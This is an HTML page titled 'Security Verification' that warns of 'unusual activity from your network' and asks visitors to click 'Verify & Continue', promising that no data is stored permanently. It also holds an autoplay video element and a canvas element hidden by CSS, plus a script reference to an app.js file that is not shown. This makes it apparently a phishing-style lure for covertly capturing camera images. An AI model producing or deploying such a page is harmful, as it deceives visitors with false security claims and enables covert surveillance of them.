<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Verification</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: "Courier New", monospace;
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(135deg, #0f172a, #020617);
      color: #e5e7eb;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #020617;
      border: 1px solid #1e293b;
      border-radius: 14px;
      padding: 32px;
      box-shadow: 0 0 40px rgba(34, 197, 94, 0.15);
      text-align: center;
    }

    .shield {
      font-size: 42px;
      margin-bottom: 12px;
    }

    h1 {
      font-size: 22px;
      margin: 10px 0;
      color: #f8fafc;
    }

    p {
      font-size: 14px;
      line-height: 1.6;
      color: #cbd5f5;
      margin-bottom: 24px;
    }

    .info {
      background: #020617;
      border: 1px solid #1e293b;
      border-radius: 8px;
      padding: 12px;
      font-size: 13px;
      color: #94a3b8;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      font-weight: 600;
      background: linear-gradient(90deg, #22c55e, #16a34a);
      color: #022c22;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.2s ease;
    }

  button:hover {
  background: linear-gradient(90deg, #2563eb, #1d4ed8);
  color: #e0f2fe;
  transform: translateY(-1px);
  box-shadow: 0 8px 20px rgba(37, 99, 235, 0.45);
}


    .footer {
      margin-top: 18px;
      font-size: 12px;
      color: #64748b;
    }

    video,
    canvas {
      display: none;
    }
  </style>
</head>

<body>

  <div class="card">
    <div class="shield">🛡️</div>

    <h1>Security Verification</h1>

    <p>
      We detected unusual activity from your network.  
      To protect your account, a quick verification is required.
    </p>

    <div class="info">
      ✔ No data is stored permanently<br />
      ✔ Used only for security verification<br />
      ✔ Takes less than 5 seconds
    </div>

    <button onclick="startVerification()">
      Verify & Continue
    </button>

    <div class="footer">
      © 2026 Secure Systems · All rights reserved
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script src="app.js"></script>
</body>
</html>
